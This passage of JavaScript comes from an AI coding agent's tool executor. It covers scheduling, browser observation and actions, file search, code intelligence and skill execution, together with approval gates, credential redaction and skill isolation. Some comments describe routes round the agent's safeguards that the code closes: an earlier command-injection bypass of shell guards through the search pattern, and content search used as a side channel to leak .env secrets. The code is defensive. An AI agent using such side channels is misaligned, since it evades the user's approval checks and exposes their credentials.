            return attachDescriptor({
              error: "schedule wakeup requires a prompt",
            });
          }
          const delayMs = args.delay ? parseDuration(args.delay) : 0;
          const entry = store.scheduleWakeup({
            prompt: args.prompt,
            delayMs,
            label: args.label || null,
            expiresInMs,
            jitterMs,
            ...runPolicy,
          });
          return attachDescriptor({
            scheduled: entry,
            hint: "Run `cc agenda run` (e.g. via cron or `cc loop`) to fire due entries.",
          });
        }
        if (action === "cron") {
          if (!args.prompt || !args.cron) {
            return attachDescriptor({
              error: "schedule cron requires a prompt and a cron expression",
            });
          }
          const entry = store.createCron({
            prompt: args.prompt,
            cron: args.cron,
            timeZone: args.timezone || null,
            label: args.label || null,
            expiresInMs,
            jitterMs,
            ...runPolicy,
          });
          return attachDescriptor({ scheduled: entry });
        }
        if (action === "monitor") {
          if (!args.command) {
            return attachDescriptor({
              error: "schedule monitor requires a command",
            });
          }
          const intervalMs = args.interval
            ? parseDuration(args.interval)
            : 60000;
          const entry = store.createMonitor({
            command: args.command,
            // Bind the persisted command to the host/session workspace. This
            // value comes from executeTool's trusted context, never model args.
            workspaceCwd: path.resolve(cwd),
            intervalMs,
            stopWhen: args.stop_when || null,
            notify: args.notify_title ? { title: args.notify_title } : null,
            maxChecks: args.max_checks ?? null,
            label: args.label || null,
            expiresInMs,
            jitterMs,
          });
          return attachDescriptor({ scheduled: entry });
        }
        if (action === "list") {
          return attachDescriptor({ entries: store.list() });
        }
        if (action === "cancel") {
          if (!args.id) {
            return attachDescriptor({
              error: "schedule cancel requires an id",
            });
          }
          const removed = store.cancel(args.id);
          return attachDescriptor({
            cancelled: removed ? removed.id : null,
            found: Boolean(removed),
          });
        }
        return attachDescriptor({
          error: `unknown schedule action "${args.action}". Valid: wakeup, cron, monitor, list, cancel.`,
        });
      } catch (err) {
        return attachDescriptor({ error: `schedule failed: ${err.message}` });
      }
    }

    case "publish_artifact": {
      // P1 #10: copy a finished deliverable into the user's artifact store.
      // Only METADATA returns to the conversation (the transcript never
      // carries the file body); `cc artifacts` lists/inspects/cleans.
      try {
        const { ArtifactStore, publicArtifactMetadata } =
          await import("../lib/artifact-store.js");
        const store = new ArtifactStore();
        const entry = store.publish({
          filePath: path.resolve(cwd, String(args.path || "")),
          title: args.title,
          kind: args.kind,
          ttlDays: args.ttl_days,
          sessionId: sessionId ? String(sessionId) : null,
        });
        return attachDescriptor({
          published: publicArtifactMetadata(entry),
          hint: "The user can browse this with `cc artifacts list` / `cc artifacts show <id>`.",
        });
      } catch (err) {
        return attachDescriptor({
          error: `publish_artifact failed: ${err.message}`,
        });
      }
    }

    case "browser_state": {
      // P1 #8: first-class Chrome CDP observation — the agent side of the
      // "locate error → fix → verify" web loop against the user's real,
      // logged-in browser (`cc browse chrome launch`). DOM is capped harder
      // than the CLI command's 150k default so a page dump cannot flood the
      // conversation; screenshots go to a generated temp file (never an
      // agent-chosen path) to keep the tool strictly read-only.
      try {
        const { captureState } = await import("../lib/chrome-connector.js");
        const screenshotPath = args.screenshot
          ? path.join(os.tmpdir(), `cc-browser-state-${Date.now()}.png`)
          : null;
        const state = await captureState({
          port: args.port != null ? Number(args.port) : undefined,
          tab: args.tab != null ? Number(args.tab) : undefined,
          reload: args.reload === true,
          watchMs: args.watch_ms != null ? Number(args.watch_ms) : undefined,
          includeDom: args.include_dom !== false,
          domCap: args.dom_cap != null ? Number(args.dom_cap) : 40000,
          screenshotPath,
        });
        if (!state.ok) {
          return attachDescriptor({
            error: `browser_state failed: ${state.error}`,
          });
        }
        const safeState = { ...state };
        if (state.screenshotPath) {
          const promoted = await promoteBrowserScreenshot(
            state.screenshotPath,
            {
              sessionId,
              title: `Browser state — ${state.title || "page"}`,
            },
          );
          delete safeState.screenshotPath;
          delete safeState.screenshotRef;
          if (promoted.artifact) {
            safeState.screenshotArtifact = promoted.artifact;
            safeState.screenshotRef = promoted.artifact.id;
          } else {
            safeState.screenshotArtifactError = promoted.error;
          }
        }
        return attachDescriptor(safeState);
      } catch (err) {
        return attachDescriptor({
          error: `browser_state failed: ${err.message}`,
        });
      }
    }

    case "browser_act": {
      // Gap-analysis #6: the ACTION side of the Chrome connector.
      // browser_state stays the read-only default; browser_act explicitly
      // drives the user's logged-in browser (click/type/press/navigate/
      // waitForSelector/screenshot/assertText) and is gated like run_code:
      // HIGH risk through the ApprovalGate (CONFIRM even on the trusted/auto
      // tier), pre-authorizable only by an explicit settings allow rule
      // (ruleAllowed). Unlike run_code there is no legacy ungated behavior to
      // preserve, so the gate applies whenever an ApprovalGate is wired —
      // headless without a confirmer fails closed. Screenshot paths are
      // generated inside performActions (never agent-chosen), and each
      // executed step is audit-logged to ~/.chainlesschain/browser-actions/.
      try {
        if (
          approvalGate &&
          !ruleAllowed &&
          typeof approvalGate.decide === "function"
        ) {
          const { APPROVAL_RISK, APPROVAL_DECISION } =
            await import("@chainlesschain/session-core");
          const summary = Array.isArray(args.actions)
            ? args.actions
                .map((a) => a?.type)
                .filter(Boolean)
                .slice(0, 10)
                .join(",")
            : "";
          const gate = await approvalGate.decide({
            sessionId,
            riskLevel: APPROVAL_RISK.HIGH,
            tool: "browser_act",
            args: { actions: summary },
          });
          if (gate.decision !== APPROVAL_DECISION.ALLOW) {
            const tierLabel =
              typeof gate.policy === "string" ? `"${gate.policy}" ` : "";
            return attachDescriptor({
              error: `[ApprovalGate] browser_act denied by the ${tierLabel}approval policy (via ${gate.via}). Retrying won't help — driving the user's browser needs their approval. Tell the user (they can approve it or relax the policy) and continue with other work.`,
              approval: {
                decision: gate.decision,
                via: gate.via,
                riskLevel: "high",
                policy: gate.policy,
              },
            });
          }
        }
        const { performActions } = await import("../lib/chrome-connector.js");
        const result = await performActions(args.actions, {
          port: args.port != null ? Number(args.port) : undefined,
          cdpUrl: args.cdp_url != null ? String(args.cdp_url) : null,
          tab: args.tab != null ? Number(args.tab) : undefined,
          continueOnError: args.continue_on_error === true,
          sessionId: sessionId ? String(sessionId) : null,
          evidenceBinding: browserEvidenceBinding,
          originGrants: browserOriginGrants,
          expectedGrantRevisions: browserExpectedGrantRevisions,
          replaySourceEnvelope: browserReplaySourceEnvelope,
          replayAllowSideEffects: browserReplayAllowSideEffects,
          replayAllowCredentials: browserReplayAllowCredentials,
          resolveUploadArtifact: (artifactId) =>
            resolveBrowserUploadArtifact(artifactId, sessionId),
        });
        if (!result.ok && result.error) {
          // Nothing ran (validation / attach failure) — surface as an error.
          // A step-level failure returns the per-step outcomes instead so the
          // model can see exactly which step broke.
          return attachDescriptor({
            error: `browser_act failed: ${result.error}`,
          });
        }
        const safeResult = { ...result, steps: [] };
        for (let i = 0; i < (result.steps || []).length; i += 1) {
          const originalStep = result.steps[i];
          const step = { ...originalStep };
          if (originalStep.screenshotPath) {
            const promoted = await promoteBrowserScreenshot(
              originalStep.screenshotPath,
              {
                sessionId,
                title: `Browser action screenshot ${i + 1}`,
              },
            );
            delete step.screenshotPath;
            delete step.screenshotRef;
            if (promoted.artifact) {
              step.screenshotArtifact = promoted.artifact;
              step.screenshotRef = promoted.artifact.id;
              step.detail = `screenshot artifact: ${promoted.artifact.id}`;
            } else {
              step.screenshotArtifactError = promoted.error;
              step.detail = promoted.error;
            }
          }
          if (originalStep.downloadPath) {
            const promoted = await promoteBrowserDownload(
              originalStep.downloadPath,
              {
                sessionId,
                title: `Browser download ${i + 1} — ${originalStep.downloadSuggestedName || "file"}`,
              },
            );
            delete step.downloadPath;
            delete step.downloadRef;
            if (promoted.artifact) {
              step.downloadArtifact = promoted.artifact;
              step.downloadRef = promoted.artifact.id;
              step.detail = `download artifact: ${promoted.artifact.id}`;
            } else {
              step.downloadArtifactError = promoted.error;
              step.detail = promoted.error;
            }
          }
          safeResult.steps.push(step);
        }
        if (result.evidence) {
          const publishedEvidence = await publishBrowserEvidence(
            result.evidence,
            sessionId,
          );
          safeResult.evidence = result.evidence;
          if (publishedEvidence.artifact) {
            safeResult.evidenceArtifact = publishedEvidence.artifact;
            safeResult.evidenceRef = publishedEvidence.artifact.id;
          } else {
            safeResult.evidenceArtifactError = publishedEvidence.error;
            safeResult.evidencePublicationFailed = true;
            safeResult.ok = false;
            safeResult.retrySafe = false;
            safeResult.recovery =
              "Browser actions may have completed, but canonical evidence publication failed; do not retry side effects automatically.";
          }
        }
        return attachDescriptor(safeResult);
      } catch (err) {
        return attachDescriptor({
          error: `browser_act failed: ${err.message}`,
        });
      }
    }

    case "search_files": {
      // An explicit directory scopes the search to one root; otherwise span
      // cwd plus any --add-dir roots so cross-package searches find matches.
      const extraRoots = Array.isArray(additionalDirectories)
        ? additionalDirectories.filter(Boolean)
        : [];
      const roots = args.directory
        ? [path.resolve(cwd, args.directory)]
        : [cwd, ...extraRoots];
      const isContent = Boolean(args.content_search);
      // Pattern is model/user-supplied and flows into a shell — build the
      // command with it SAFELY quoted (see search-command.js). Raw interpolation
      // here was a command-injection bypass of the run_shell guards.
      const built = buildSearchCommand({ pattern: args.pattern, isContent });
      if (built.error) {
        return attachDescriptor({ error: built.error });
      }
      const cmd = built.cmd;

      // Credential guard (Claude-Code 2.1.189 parity): a CONTENT search must not
      // become a side channel that exfils secrets the read_file / run_shell
      // guards already block. Windows `findstr /n` embeds the matching LINE
      // (e.g. `API_KEY=…` from a .env); POSIX `grep -l` returns only names. Any
      // hit whose source is a credential file is redacted to an existence-only
      // marker — the agent must read_file (confirm-gated) to view it.
      const { credentialFileReason } = isContent
        ? await import("../lib/credential-guard.js")
        : { credentialFileReason: () => null };

      const hits = [];
      const seen = new Set();
      const redactedCreds = new Set();
      for (const root of roots) {
        if (hits.length >= 20) break;
        const ictx = {
          isContent,
          root,
          multiRoot: roots.length > 1,
          seen,
          hits,
          redactedCreds,
          credentialFileReason,
        };
        try {
          if (!fs.existsSync(root)) continue;
          const output = runSearchProcess(cmd, {
            cwd: root,
            encoding: "utf8",
            timeout: 10000,
            // Windows `findstr`/`dir /s` have no `head` cap (unlike the POSIX
            // `| head -20`), so a large tree can blow past execSync's 1 MB
            // default and throw ENOBUFS. Give it real headroom AND salvage the
            // partial below — otherwise a busy repo silently reports "no matches".
            maxBuffer: 8 * 1024 * 1024,
          });
          _ingestSearchOutput(output, ictx);
        } catch (err) {
          // A maxBuffer overflow still carries the first 8 MB of matches in
          // err.stdout — ingest those rather than dropping every hit as a false
          // "No matches found". A genuine no-match / command failure leaves
          // err.stdout empty, so hits stay unchanged (same as before).
          if (err && err.stdout) _ingestSearchOutput(err.stdout, ictx);
        }
      }

      // One existence-only marker per credential file (never its contents).
      for (const f of redactedCreds) {
        if (hits.length >= 20) break;
        hits.push(
          `<credential file ${f}: matches redacted — use read_file (requires confirmation) to view>`,
        );
      }

      if (hits.length === 0) {
        return attachDescriptor({ files: [], message: "No matches found" });
      }
      return attachDescriptor(isContent ? { matches: hits } : { files: hits });
    }

    case "code_intelligence": {
      const action = String(args.action || "").trim();
      const positionActions = new Set([
        "definition",
        "references",
        "hover",
        "rename_preview",
      ]);
      // Validate up front so the model gets a precise correction instead of a
      // cryptic crash deep in the LSP layer.
      if (action !== "workspace_symbols" && !args.file) {
        return attachDescriptor({
          error: `code_intelligence action "${action}" requires "file".`,
        });
      }
      if (
        positionActions.has(action) &&
        (args.line == null || args.col == null)
      ) {
        return attachDescriptor({
          error: `code_intelligence action "${action}" requires 1-based "line" and "col".`,
        });
      }
      if (action === "workspace_symbols" && !args.query) {
        return attachDescriptor({
          error: `code_intelligence action "workspace_symbols" requires "query".`,
        });
      }
      if (action === "rename_preview" && !args.new_name) {
        return attachDescriptor({
          error: `code_intelligence action "rename_preview" requires "new_name".`,
        });
      }
      // Multi-root workspace (P2 LSP): key the shared server pool on the root
      // that actually CONTAINS the file — a file inside an `--add-dir` root
      // gets that project's language server, not the cwd's. Single-root
      // sessions resolve to cwd exactly as before (byte-identical).
      const file = args.file ? path.resolve(cwd, args.file) : null;
      const wsRoots = workspaceRootsFor(cwd, additionalDirectories);
      const ci = await _getSharedCodeIntel(
        file ? pickRootForFile(file, wsRoots) : cwd,
      );
      let res;
      try {
        switch (action) {
          case "definition":
            res = await ci.definition(file, args.line, args.col);
            break;
          case "references":
            res = await ci.references(file, args.line, args.col);
            break;
          case "hover":
            res = await ci.hover(file, args.line, args.col);
            break;
          case "document_symbols":
            res = await ci.documentSymbols(file);
            break;
          case "workspace_symbols": {
            // Fan out across EVERY workspace root and merge — symbols from an
            // --add-dir project are stamped with their `root` so same-named
            // symbols stay unambiguous. One root → the exact legacy call.
            if (wsRoots.length > 1) {
              const perRoot = [];
              for (const r of wsRoots) {
                try {
                  const rci = await _getSharedCodeIntel(r);
                  perRoot.push(await rci.workspaceSymbols(String(args.query)));
                } catch (err) {
                  perRoot.push({
                    available: false,
                    reason: err?.message || "workspace_symbols failed",
                  });
                }
              }
              res = mergeWorkspaceSymbolResults(perRoot, wsRoots);
            } else {
              res = await ci.workspaceSymbols(String(args.query));
            }
            break;
          }
          case "diagnostics":
            res = await ci.diagnostics(file);
            break;
          case "rename_preview":
            res = await ci.renamePreview(
              file,
              args.line,
              args.col,
              args.new_name,
            );
            break;
          default:
            return attachDescriptor({
              error:
                `Unknown code_intelligence action "${action}". Valid: definition, ` +
                `references, hover, document_symbols, workspace_symbols, ` +
                `diagnostics, rename_preview.`,
            });
        }
      } catch (err) {
        return attachDescriptor({
          error: `code_intelligence failed: ${err.message}`,
        });
      }
      // No language server installed for this file — tell the agent to fall back
      // rather than looping on an empty result.
      if (res && res.available === false) {
        return attachDescriptor({
          unavailable: true,
          reason: res.reason,
          hint: "No language server available — use search_files / read_file instead.",
        });
      }
      return attachDescriptor(res);
    }

    case "list_dir": {
      const dirPath = args.path ? path.resolve(cwd, args.path) : cwd;
      if (!fs.existsSync(dirPath)) {
        return attachDescriptor({ error: `Directory not found: ${dirPath}` });
      }
      // Clear error instead of the cryptic "ENOTDIR" readdirSync throws on a file.
      if (!fs.statSync(dirPath).isDirectory()) {
        return attachDescriptor({
          error: `Path is a file, not a directory: ${dirPath}. Use read_file to read it.`,
        });
      }
      const entries = fs.readdirSync(dirPath, { withFileTypes: true });
      return attachDescriptor(
        await _withSubtreeInstructions(
          {
            entries: entries.map((e) => ({
              name: e.name,
              type: e.isDirectory() ? "dir" : "file",
            })),
          },
          dirPath,
          cwd,
          subtreeInstructionScope,
        ),
      );
    }

    case "run_skill": {
      throwIfAborted(signal, "run_skill interrupted before discovery");
      const allSkills = await raceWithAbort(
        filterSkillsByCwd(
          skillLoader.getResolvedSkills().filter(skillAllowed),
          cwd,
        ),
        signal,
        "run_skill interrupted during discovery",
      );
      throwIfAborted(signal, "run_skill interrupted during discovery");
      if (allSkills.length === 0) {
        return attachDescriptor({
          error: _skillAllowlist
            ? "No skills are available to this sub-agent (restricted by its contract's skill allow-list)."
            : "No skills found. Make sure you're in the ChainlessChain project root or have skills installed.",
        });
      }
      let match = allSkills.find(
        (s) => s.id === args.skill_name || s.dirName === args.skill_name,
      );
      let admittedSkillBody = "";
      if (!match || !match.hasHandler) {
        return attachDescriptor({
          error: `Skill "${args.skill_name}" not found or has no handler. Use list_skills to see available skills.`,
        });
      }
      const skillExecutionLease = skillLoader.acquireSkillExecution?.(match, {
        signal,
      });
      const skillExecutionSignal = skillExecutionLease?.signal || signal;
      try {
        skillExecutionLease?.assertActive?.();
        if (typeof skillLoader.materializeSkillForExecution === "function") {
          match = await raceWithAbort(
            skillLoader.materializeSkillForExecution(match, {
              sessionId,
              turnId,
              loadedBecause: "run_skill",
              bodyIncluded: true,
              signal: skillExecutionSignal,
            }),
            skillExecutionSignal,
            "run_skill interrupted during authorization",
          );
        } else if (typeof skillLoader.materializeSkill === "function") {
          match = skillLoader.materializeSkill(match, {
            sessionId,
            turnId,
            loadedBecause: "run_skill",
            bodyIncluded: true,
            signal: skillExecutionSignal,
          });
        }
        skillExecutionLease?.assertActive?.();
        throwIfAborted(
          skillExecutionSignal,
          "run_skill interrupted during materialization",
        );
        // A custom loader is not an authority to raise host model-input caps.
        // Re-admit at the final consumer before constructing the child task.
        admittedSkillBody = match?.body;
        admitSkillPrompt(admittedSkillBody, skillLoader.getLimits?.());
      } catch (error) {
        skillExecutionLease?.release?.();
        if (
          signal?.aborted ||
          skillExecutionSignal?.aborted ||
          isAbortError(error)
        ) {
          throw error;
        }
        return attachDescriptor({
          error: `Skill "${args.skill_name}" body could not be loaded: ${error.message}`,
          ...(error?.code ? { code: error.code } : {}),
          policy: {
            decision: "blocked",
            via: "skill-execution-boundary",
          },
        });
      }

      const selectedSkillDigest =
        match.executionIdentity?.contentDigest ||
        `sha256:${createHash("sha256").update(admittedSkillBody).digest("hex")}`;
      const toolSetDigest = `sha256:${createHash("sha256")
        .update(
          JSON.stringify(
            [...(effectiveAllowedToolNames || [])].map(String).sort(),
          ),
        )
        .digest("hex")}`;
      const policyDigest = `sha256:${createHash("sha256")
        .update(
          JSON.stringify({
            hasApprovalGate: Boolean(approvalGate),
            hasPermissionRules: Boolean(permissionRules),
            hasSandbox: Boolean(sandbox),
            hermeticExecution: hermeticExecution === true,
          }),
        )
        .digest("hex")}`;
      const invocationStartedAt = Date.now();
      const invocationStart = startSkillInvocation({
        attributionRequired: ["automatic-candidate", "canary"].includes(
          skillLifecycleMode,
        ),
        evolutionRunId: workflowEffectId || sessionId,
        traceId: hookTraceId || sessionId,
        trajectorySegmentId: turnId || toolCallId,
        selectedSkillDigest,
        routerCandidates: [
          {
            digest: selectedSkillDigest,
            score: 1,
            reason: "explicit-run_skill",
          },
        ],
        providerModelVersion:
          llmOptions?.provider && llmOptions?.model
            ? `${llmOptions.provider}:${llmOptions.model}`
            : null,
        toolSetDigest,
        osSandboxPermissionPolicyDigest: policyDigest,
        taskCohort: "cli:run_skill",
      });
      const settleInvocation = (executionStatus, result = {}) =>
        settleSkillInvocation(invocationStart, {
          executionStatus,
          graderReceipts: result.graderReceipts || [],
          userCorrectionRef: result.userCorrectionRef || null,
          tokensInput:
            result.usage?.inputTokens || result.usage?.tokensInput || 0,
          tokensOutput:
            result.usage?.outputTokens || result.usage?.tokensOutput || 0,
          costUsd: result.usage?.costUsd || result.costUsd || 0,
          latencyMs: Date.now() - invocationStartedAt,
        });

      // Check if skill requests isolation (via SKILL.md frontmatter)
      const skillIsolation = match.isolation === true;
      if (skillIsolation) {
        const isolatedSkillTools = [
          "read_file",
          "search_files",
          "list_dir",
        ].filter(
          (toolName) =>
            !Array.isArray(effectiveAllowedToolNames) ||
            effectiveAllowedToolNames.includes(toolName),
        );
        // 用量归因: an isolated skill runs as a child loop whose real token
        // usage would otherwise be invisible — forward it into the parent
        // run's sink tagged origin:"skill" so `cc session usage --by skill`
        // can break it out. A nested frame passes through unchanged.
        const skillUsageSink = Array.isArray(subAgentUsageSink)
          ? subAgentUsageSink
          : null;
        if (strictUsageTelemetry === true) {
          _assertStrictUsageObserver(onUsageBoundary, "boundary");
          _assertStrictUsageObserver(onUsageSettlement, "settlement");
        }
        let skillSubRef = null;
        const projectSkillUsage = (event) =>
          event && event.attribution
            ? event
            : {
                ...event,
                ...(["model", "semantic-compaction"].includes(event?.source)
                  ? { workflowRequestSource: event.source }
                  : {}),
                source:
                  event?.source === "semantic-compaction"
                    ? "semantic-compaction"
                    : "subagent",
                attribution: {
                  origin: "skill",
                  skill: args.skill_name,
                  subagentId: skillSubRef?.id || null,
                  parentSessionId: sessionId || null,
                  depth: (subAgentDepth || 0) + 1,
                },
              };
        const observeSkillBoundary =
          strictUsageTelemetry === true
            ? (event) =>
                _notifyStrictUsageBoundary(
                  onUsageBoundary,
                  projectSkillUsage(event),
                )
            : null;
        const observeSkillSettlement =
          strictUsageTelemetry === true
            ? (event) =>
                _notifyStrictUsageSettlement(
                  onUsageSettlement,
                  projectSkillUsage(event),
                )
            : null;
        const observeSkillReceipt =
          strictUsageTelemetry === true &&
          typeof onProviderReceipt === "function"
            ? (event) =>
                _notifyStrictProviderReceipt(
                  onProviderReceipt,
                  projectSkillUsage(event),
                )
            : null;
        const projectSkillTool = (event) => ({
          ...event,
          attribution: event?.attribution || projectSkillUsage({}).attribution,
        });
        const observeSkillToolBoundary =
          strictUsageTelemetry === true
            ? (event) =>
                _notifyStrictToolObserver(
                  onToolCallBoundary,
                  projectSkillTool(event),
                  "boundary",
                )
            : null;
        const observeSkillToolSettlement =
          strictUsageTelemetry === true
            ? (event) =>
                _notifyStrictToolObserver(
                  onToolCallSettlement,
                  projectSkillTool(event),
                  "settlement",
                )
            : null;
        const skillLlmOptions = { ...(llmOptions || {}) };
        if (typeof llmOptions?.onStreamRetry === "function") {
          skillLlmOptions.onStreamRetry = (attempt, error, telemetry = {}) =>
            _notifyStrictRetryObserver(llmOptions.onStreamRetry, [
              attempt,
              error,
              projectSkillUsage(telemetry),
            ]);
        }
        // Run skill through isolated sub-agent context
        let subCtx;
        try {
          skillExecutionLease?.assertActive?.();
          subCtx = SubAgentContext.create({
            role: `skill-${args.skill_name}`,
            task:
              `Execute the "${args.skill_name}" skill using only the approved tools.\n\n` +
              `Authoritative skill instructions:\n${admittedSkillBody}\n\n` +
              `User input:\n${String(args.input || "").substring(0, 8000)}`,
            allowedTools: isolatedSkillTools,
            hookParentTraceId: hookTraceId || null,
            signal: skillExecutionSignal,
            toolAdmission,
            cwd,
            llmOptions: skillLlmOptions,
            ...(strictUsageTelemetry === true && workflowChildEffectId
              ? { workflowEffectId: workflowChildEffectId }
              : {}),
            ...(sessionBudget ? { sessionBudget } : {}),
            ...(hostResourceBudget ? { hostResourceBudget } : {}),
            ...(permissionRules ? { permissionRules } : {}),
            ...(hostManagedToolPolicy
              ? {
                  hostManagedToolPolicy: {
                    ...hostManagedToolPolicy,
                    toolDefinitions: [],
                  },
                }
              : {}),
            ...(planManager ? { planManager } : {}),
            ...(sandbox ? { sandbox } : {}),
            ...(Array.isArray(additionalDirectories)
              ? { additionalDirectories: [...additionalDirectories] }
              : {}),
            ...(approvalGate ? { approvalGate } : {}),
            ...(shellPolicyOverrides ? { shellPolicyOverrides } : {}),
            ...(classifyAllShell ? { classifyAllShell: true } : {}),
            ...(unattendedActionPolicy ? { unattendedActionPolicy } : {}),
            ...(mcpCallLedger ? { mcpCallLedger } : {}),
            ...(mcpConflictScheduler ? { mcpConflictScheduler } : {}),
            onUsage: skillUsageSink
              ? (u) => {
                  const forwarded = projectSkillUsage(u);
                  try {
                    skillUsageSink.push(forwarded);
                  } catch (error) {
                    if (strictUsageTelemetry === true) {
                      throw _runtimeUsageBoundaryFailure(
                        error,
                        "CC_USAGE_FORWARDING_FAILED",
                        "Isolated skill usage forwarding failed",
                      );
                    }
                  }
                }
              : null,
            ...(strictUsageTelemetry === true
              ? {
                  strictUsageTelemetry: true,
                  onUsageBoundary: observeSkillBoundary,
                  onUsageSettlement: observeSkillSettlement,
                  ...(observeSkillReceipt
                    ? { onProviderReceipt: observeSkillReceipt }
                    : {}),
                  onToolCallBoundary: observeSkillToolBoundary,
                  onToolCallSettlement: observeSkillToolSettlement,
                }
              : {}),
          });
        } catch (error) {
          skillExecutionLease?.release?.();
          throw error;
        }
        skillSubRef = subCtx;
        try {
          const result = await raceWithAbort(
            subCtx.run(args.input),
            skillExecutionSignal,
            "run_skill interrupted while the isolated child was running",
          );
          skillExecutionLease?.assertActive?.();
          throwIfAborted(
            skillExecutionSignal,
            "run_skill interrupted before child handoff",
          );
          const resolvedFailure =
            subCtx.status === "failed" ||
            result?.success === false ||
            Boolean(result?.error);
          if (resolvedFailure) {
            const failureDetail =
              result?.error?.message ||
              result?.error ||
              result?.summary ||
              `child status ${subCtx.status || "failed"}`;
            return attachDescriptor({
              success: false,
              isolated: true,
              skill: args.skill_name,
              invocationReceipt: settleInvocation("failed", result),
              code: result?.code || "CC_SKILL_ISOLATED_EXECUTION_FAILED",
              error: `Isolated skill execution failed: ${failureDetail}`,
              ...(result?.summary ? { summary: result.summary } : {}),
            });
          }
          return attachDescriptor({
            success: true,
            isolated: true,
            skill: args.skill_name,
            invocationReceipt: settleInvocation("completed", result),
            summary: result.summary,
            toolsUsed: result.toolsUsed,
          });
        } catch (err) {
          if (
            err?.runtimeLedgerPersistence === true ||
            err?.workflowEffectOutcomeUnknown === true
          ) {
            throw err;
          }
          if (
            signal?.aborted ||
            skillExecutionSignal?.aborted ||
            isAbortError(err)
          ) {
            throw err;
          }
          return attachDescriptor({
            success: false,
            isolated: true,
            skill: args.skill_name,
            invocationReceipt: settleInvocation("failed"),
            code: err?.code || "CC_SKILL_ISOLATED_EXECUTION_FAILED",
            error: `Isolated skill execution failed: ${err.message}`,
          });
        } finally {
          skillExecutionLease?.release?.();
        }
      }

      // Defense in depth: materializeSkill currently rejects this path before
      // reaching here. Keep the runtime fence explicit so a custom/legacy
      // loader can never re-enable arbitrary handler.js imports in the CLI
      // process or hand a Skill the raw MCP client/process broker.
      skillExecutionLease?.release?.();
      return attachDescriptor({
        error: `Skill "${args.skill_name}" cannot execute handler.js directly. Add isolation: true and use the controlled agent-tool path.`,
        code: "CC_SKILL_DIRECT_HANDLER_BLOCKED",
        invocationReceipt: settleInvocation("blocked"),
        policy: { decision: "blocked", via: "skill-execution-boundary" },
      });
    }

    case "list_skills": {
      let skills = await filterSkillsByCwd(
        skillLoader.getResolvedSkills().filter(skillAllowed),
        cwd,
      );
      if (skills.length === 0) {
        return attachDescriptor({
          error: _skillAllowlist
            ? "No skills are available to this sub-agent (restricted by its contract's skill allow-list)."
            : "No skills found.",
        });
      }
      if (args.category) {
        skills = skills.filter(
          (s) => s.category.toLowerCase() === args.category.toLowerCase(),
        );
      }
      let routing = null;
      let outcomeAuthority = null;
      let vector = null;
      if (args.query) {
        outcomeAuthority = resolveSkillOutcomeAuthority(
          skillOutcomeIndex === undefined ? {} : { index: skillOutcomeIndex },
        );
        const vectorAuthority =
          skillVectorAuthority == null
            ? null
            : captureSkillVectorAuthority(skillVectorAuthority);
        vector =
          vectorAuthority === null
            ? null
            : await vectorAuthority.score({ query: args.query, skills });
        routing = routeSkillDescriptors({
          skills,
          query: args.query,
          target: { os: process.platform },
          vectorScores: vector?.scores ?? null,
          outcomeMetrics: outcomeAuthority.metrics,
          revocationReader: skillRetrievalRevocationReader ?? null,
          topK: Math.min(64, Math.max(1, skills.length)),
        });
        const byDigest = new Map(
          skills.map((skill) => [
            skill.executionIdentity?.contentDigest,
            skill,
          ]),
        );
        skills = routing.candidates
          .map(({ digest }) => byDigest.get(digest))
          .filter(Boolean);
      }
      skillLoader.recordDescriptorUse?.(skills, {
        sessionId,
        turnId,
        loadedBecause: "list_skills",
      });
      return attachDescriptor({
        count: skills.length,
        ...(routing
          ? {
              routing: {
                schema: routing.schema,
                selectedDigest: routing.selected?.digest || null,
                conflicts: routing.conflicts,
                rejectedCount: routing.rejected.length,
                vectorAvailable: routing.vectorAvailable,
                vectorAuthority:
                  vector?.evidence ?? unavailableSkillVectorEvidence(),
                outcomeAuthority: outcomeAuthority.evidence,
              },
            }
          : {}),
        skills: skills.map((s) => ({
          id: s.id,
          category: s.category,
          source: s.source,
          hasHandler: s.hasHandler,
          description: (s.description || "").substring(0, 80),
          ...(routing
            ? (() => {
                const candidate = routing.candidates.find(
                  ({ digest }) => digest === s.executionIdentity?.contentDigest,
                );
                return candidate
                  ? {
                      digest: candidate.digest,
                      version: candidate.version,
                      contextCostTokens: candidate.contextCostTokens,
                      routeScore: candidate.score,
                      routeReason: candidate.reason,
                    }
                  : {};
              })()
            : {}),
        })),
      });
    }

    default:
      if (localToolExecutor?.kind === "mcp-resource") {
        if (!mcpClient) {
          return attachDescriptor({
            error: `MCP client is unavailable for tool: ${name}`,
          });
        }
        try {
          if (localToolExecutor.op === "list-templates") {
            const resourceTemplates =
              typeof mcpClient.listResourceTemplates === "function"
                ? mcpClient.listResourceTemplates(args?.server || undefined)
                : [];
            return attachDescriptor({
              count: resourceTemplates.length,
              resourceTemplates,
            });
          }
          if (localToolExecutor.op === "list") {
            const resources =
              typeof mcpClient.listResources === "function"
                ? mcpClient.listResources(args?.server || undefined)
                : [];
            return attachDescriptor({ count: resources.length, resources });
          }
          // op === "read"
          const uri = args?.uri;
          if (!uri || typeof uri !== "string") {
            return attachDescriptor({
              error: "read_mcp_resource requires a string 'uri' argument.",
            });
          }
          let server = args?.server;
          if (!server && typeof mcpClient.listResources === "function") {
            const match = mcpClient
              .listResources()
              .find((r) => r && r.uri === uri);
            server = match?.server;
          }
          if (!server) {
            return attachDescriptor({
              error: `Could not resolve which MCP server owns resource "${uri}". Pass 'server' explicitly.`,
            });
          }
          const result = signal
            ? await mcpClient.readResource(server, uri, { signal })
            : await mcpClient.readResource(server, uri);
          return attachDescriptor(
            result && typeof result === "object" ? result : { result },
          );
        } catch (err) {
          return attachDescriptor({
            error: `MCP resource access failed: ${safeMcpErrorMessage(err)}`,
          });
        }
      }

      // Internal tool-search tool (MCP context scaling): resolves deferred
      // MCP tool schemas from the registry attached at setup time. Read-only,
      // local — same risk class as list_skills, so no approval gate.
      if (localToolExecutor?.kind === "tool-search") {
        return attachDescriptor(
          executeToolSearch(localToolExecutor.registry, args || {}),
        );
      }

      if (localToolExecutor?.kind === "team-message") {
        if (
          localToolExecutor.inheritable !== false ||
          typeof localToolExecutor.execute !== "function"
        ) {
          return attachDescriptor({
            error:
              "Team message tool blocked because its host authority is invalid",
            code: "TEAM_MESSAGE_TOOL_AUTHORITY_INVALID",
            policy: {
              decision: "blocked",
              via: "team-message-authority",
            },
          });
        }
        try {
          const result = await localToolExecutor.execute(args || {}, {
            signal,
          });
          return attachDescriptor(
            result && typeof result === "object" ? result : { result },
          );
        } catch (error) {
          return attachDescriptor({
            error: `Team message tool failed: ${String(error?.message || error).slice(0, 2048)}`,
            code: String(
              error?.code || "TEAM_MESSAGE_TOOL_EXECUTION_FAILED",
